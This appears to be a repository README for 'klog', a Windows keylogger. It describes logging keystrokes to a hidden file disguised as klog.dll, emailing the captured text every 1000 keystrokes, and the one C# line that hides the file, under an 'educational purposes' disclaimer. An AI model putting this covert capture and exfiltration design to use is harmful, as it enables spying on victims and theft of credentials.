# klog

Keylogger for Windows.

A keylogger is a program that records your keystrokes.

Creates a (if it doesn't already exist) file called `klog.dll` which gets hidden automatically.

If you wish to unhide the file permanently, remove this code:

```csharp
File.SetAttributes(r, File.GetAttributes(r) | FileAttributes.Hidden);
```

Sends an email after 1000 keystrokes.

Path to file:

```
C:\Users\your_username\AppData\Roaming
```

Remember to enable hidden files.

**NOTE: This repo is for educational purposes only! If you use klog on a computer that does not belong to you or do not have permission to, YOU are responsible of the outcome. NOT ME.**
